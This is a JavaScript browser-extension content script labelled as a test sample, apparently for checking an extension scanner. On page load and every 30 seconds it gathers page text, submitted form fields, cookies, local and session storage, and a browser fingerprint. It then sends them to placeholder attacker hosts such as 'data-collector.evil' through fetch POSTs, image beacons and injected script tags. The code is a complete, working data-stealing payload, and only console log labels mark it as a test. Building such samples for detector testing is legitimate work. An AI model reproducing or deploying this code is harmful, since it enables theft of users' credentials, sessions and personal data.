// TEST EXTENSION: Content script with network exfiltration patterns

console.log('TEST: Network exfiltration content script loaded');

// Suspicious endpoints
const ENDPOINTS = [
  'https://suspicious-domain.com/track',
  'https://data-collector.evil/collect',
  'https://analytics-tracker.bad/page'
];

// Pattern 1: Page content exfiltration
function exfiltratePageContent() {
  const pageData = {
    url: window.location.href,
    title: document.title,
    content: document.body ? document.body.innerText.substring(0, 1000) : '',
    timestamp: Date.now(),
    referrer: document.referrer,
    userAgent: navigator.userAgent
  };
  
  console.log('TEST: Collecting page content for:', pageData.url);
  sendPageData('page_content', pageData);
}

// Pattern 2: Form data monitoring
function monitorFormData() {
  const forms = document.querySelectorAll('form');
  
  forms.forEach((form, index) => {
    console.log(`TEST: Monitoring form ${index}:`, form.action);
    
    form.addEventListener('submit', (event) => {
      const formData = new FormData(form);
      const formInfo = {
        action: form.action,
        method: form.method,
        url: window.location.href,
        timestamp: Date.now(),
        fields: {}
      };
      
      for (const [key, value] of formData.entries()) {
        // Collect form field data (including potentially sensitive info)
        formInfo.fields[key] = typeof value === 'string' ? value.substring(0, 100) : 'file';
      }
      
      console.log('TEST: Form submitted:', formInfo);
      sendPageData('form_data', formInfo);
    });
    
    // Monitor input changes
    const inputs = form.querySelectorAll('input, textarea, select');
    inputs.forEach(input => {
      if (input.type === 'password' || input.type === 'email' || input.name.includes('card')) {
        input.addEventListener('blur', () => {
          const inputData = {
            type: input.type,
            name: input.name,
            id: input.id,
            url: window.location.href,
            timestamp: Date.now(),
            hasValue: input.value.length > 0
          };
          
          console.log('TEST: Sensitive input monitored:', inputData);
          sendPageData('input_monitor', inputData);
        });
      }
    });
  });
}

// Pattern 3: Cookie access and transmission
function accessAndTransmitCookies() {
  const cookies = document.cookie;
  
  if (cookies) {
    const cookieData = {
      cookies: cookies,
      url: window.location.href,
      domain: window.location.hostname,
      timestamp: Date.now()
    };
    
    console.log('TEST: Accessing document cookies:', cookies.length, 'characters');
    sendPageData('document_cookies', cookieData);
  }
}

// Pattern 4: Local/Session storage access
function accessLocalStorage() {
  try {
    const localStorageData = {};
    const sessionStorageData = {};
    
    // Access localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }
    
    // Access sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      sessionStorageData[key] = sessionStorage.getItem(key);
    }
    
    const storageData = {
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      url: window.location.href,
      timestamp: Date.now()
    };
    
    console.log('TEST: Collected storage data');
    sendPageData('storage_data', storageData);
  } catch (e) {
    console.log('TEST: Storage access failed:', e.message);
  }
}

// Pattern 5: Browser fingerprinting and transmission
function collectAndTransmitFingerprint() {
  const fingerprint = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    plugins: Array.from(navigator.plugins).map(p => ({
      name: p.name,
      filename: p.filename,
      description: p.description
    })),
    mimeTypes: Array.from(navigator.mimeTypes).map(m => ({
      type: m.type,
      description: m.description,
      suffixes: m.suffixes
    })),
    url: window.location.href,
    timestamp: Date.now()
  };
  
  console.log('TEST: Collected browser fingerprint');
  sendPageData('fingerprint', fingerprint);
}

// Pattern 6: Send data to suspicious endpoints
function sendPageData(dataType, data) {
  const endpoint = ENDPOINTS[Math.floor(Math.random() * ENDPOINTS.length)];
  
  console.log(`TEST: Sending ${dataType} to ${endpoint}`);
  
  // Method 1: fetch with POST
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Exfiltrate': 'true'
    },
    body: JSON.stringify({
      type: dataType,
      data: data,
      source: 'content-script'
    })
  }).catch(err => {
    console.log('TEST: Fetch failed (expected):', err.message);
  });
  
  // Method 2: Image beacon (stealth method)
  const img = new Image();
  const encodedData = encodeURIComponent(JSON.stringify(data));
  img.src = `${endpoint}/img?t=${dataType}&d=${encodedData}`;
  img.onerror = () => {
    console.log('TEST: Image beacon failed (expected)');
  };
  
  // Method 3: Dynamic script tag injection
  const script = document.createElement('script');
  script.src = `${endpoint}/jsonp?callback=handleData&data=${encodedData}`;
  script.onerror = () => {
    console.log('TEST: JSONP script failed (expected)');
    document.head.removeChild(script);
  };
  document.head.appendChild(script);
}

// Pattern 7: Periodic data collection
function startPeriodicCollection() {
  console.log('TEST: Starting periodic data collection');
  
  // Collect data every 30 seconds
  setInterval(() => {
    accessAndTransmitCookies();
    collectAndTransmitFingerprint();
    
    // Collect current page state
    const pageState = {
      url: window.location.href,
      scrollPosition: window.scrollY,
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight
      },
      timestamp: Date.now()
    };
    
    sendPageData('page_state', pageState);
  }, 30000);
}

// Execute when page loads
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    console.log('TEST: DOM ready, starting exfiltration patterns');
    exfiltratePageContent();
    monitorFormData();
    accessAndTransmitCookies();
    accessLocalStorage();
    collectAndTransmitFingerprint();
    startPeriodicCollection();
  });
} else {
  console.log('TEST: Page already loaded, starting exfiltration patterns');
  exfiltratePageContent();
  monitorFormData();
  accessAndTransmitCookies();
  accessLocalStorage();
  collectAndTransmitFingerprint();
  startPeriodicCollection();
}